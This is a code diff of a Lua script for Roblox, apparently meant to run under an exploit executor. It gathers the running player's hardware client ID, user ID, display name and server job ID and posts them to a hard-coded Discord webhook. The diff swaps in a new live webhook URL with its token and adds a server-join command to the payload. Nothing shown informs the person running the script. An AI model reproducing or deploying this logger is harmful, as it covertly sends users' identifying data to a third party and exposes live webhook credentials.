@@ -15,11 +15,12 @@ local playerCount = #game:GetService("Players"):GetPlayers()
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 local ExecutorUsing = identifyexecutor()
 local HttpService = game:GetService("HttpService")
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 local Data =
 {
     ["embeds"] = {
         {
-            ["title"] = "Detect Account",
+            ["title"] = "Check Account",
             ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
             ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```",
             ["color"] = tonumber("0xf7c74b"),
@@ -35,15 +36,15 @@ local Data =
                     ["value"] = hwid,
                     ["inline"] = true
                 },
-                {                
-                    ["name"] = "Job ID:",
-                    ["value"] = " " .. jobId,
+                {
+                    ["name"] = "Ran:",
+                    ["value"] = "```hi```", 
                     ["inline"] = true
                 },
-                {
-                    ["name"] = "Script Teleport:",
-                    ["value"] = "\n" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance('..placeId..', "'..jobId..'", game.Players.LocalPlayer)' .. "\n", 
-                    ["inline"] = true 
+                {                
+                    ["name"] = "Job ID:",
+                    ["value"] = ConsoleJobId,
+                    ["inline"] = true
                 },
                 {
                     ["name"] = "Ty For Use:",
@@ -57,5 +58,5 @@ local Data =
 local Headers = {["Content-Type"] = "application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 local Request = http_request or request or HttpPost or syn.request
-local Final = {Url = "https://discord.com/api/webhooks/1290720995774169171/ihPompE08lQlCEN_PwYIZW8dHkCGJYID3RbQFBIzRdXyqdahKSjGOdkFK1ymLycPm4fr", Body = Encoded, Method = "POST", Headers = Headers}
+local Final = {Url = "https://discord.com/api/webhooks/1297967743949209671/bcWQ2bw2NOqQkheQdMWlNRnw6kI7yyCqu_D85JLT5NUBxUc_v2k8HyGCGj67kHM-H56q", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
